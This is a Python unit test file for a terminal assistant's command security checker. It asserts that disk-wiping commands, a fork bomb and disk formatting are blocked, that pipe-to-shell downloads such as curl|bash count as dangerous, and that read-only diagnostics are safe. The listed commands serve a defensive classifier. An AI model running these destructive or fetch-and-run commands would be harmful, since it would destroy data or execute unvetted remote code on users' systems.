import unittest
from zhirterminalassist.security import SecurityChecker, RiskLevel

class TestSecurity(unittest.TestCase):
    def test_blocked_catastrophic_commands(self):
        blocked_commands = [
            "rm -rf /",
            "rm -rf /*",
            "rm -r /",
            "rm -rf ~",
            ":(){ :|:& };:",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/nvme0n1",
        ]
        for cmd in blocked_commands:
            analysis = SecurityChecker.analyze(cmd)
            self.assertEqual(
                analysis.risk_level, RiskLevel.BLOCKED,
                f"Expected {cmd} to be BLOCKED, got {analysis.risk_level}"
            )

    def test_dangerous_sensitive_commands(self):
        dangerous_commands = [
            "rm -rf /tmp/mytest",
            "sudo pacman -R package",
            "sudo apt remove nginx",
            "systemctl disable bluetooth",
            "chmod -R 755 /var/www",
            "chown -R prun:prun /home/prun/dir",
            "curl -sSL https://example.com/script.sh | bash",
            "wget -O- https://example.com/bad.sh | sh",
        ]
        for cmd in dangerous_commands:
            analysis = SecurityChecker.analyze(cmd)
            self.assertEqual(
                analysis.risk_level, RiskLevel.DANGEROUS,
                f"Expected {cmd} to be DANGEROUS, got {analysis.risk_level}"
            )

    def test_safe_readonly_commands(self):
        safe_commands = [
            "uname -a",
            "cat /etc/os-release",
            "ls -la",
            "lspci",
            "free -m",
            "df -h",
            "pactl info",
            "systemctl status pipewire",
            "journalctl -p 3 -xb",
            "ip a",
        ]
        for cmd in safe_commands:
            analysis = SecurityChecker.analyze(cmd)
            self.assertEqual(
                analysis.risk_level, RiskLevel.SAFE,
                f"Expected {cmd} to be SAFE, got {analysis.risk_level}"
            )

    def test_command_breakdown_explainer(self):
        exp = SecurityChecker.explain_command_local("sudo pacman -Syu")
        self.assertEqual(exp["command"], "sudo pacman -Syu")
        tokens = [t[0] for t in exp["breakdown"]]
        self.assertIn("sudo", tokens)
        self.assertIn("pacman", tokens)
        self.assertIn("-S", tokens)
        self.assertIn("-y", tokens)
        self.assertIn("-u", tokens)
        self.assertEqual(exp["risk"], "Medium")

if __name__ == "__main__":
    unittest.main()
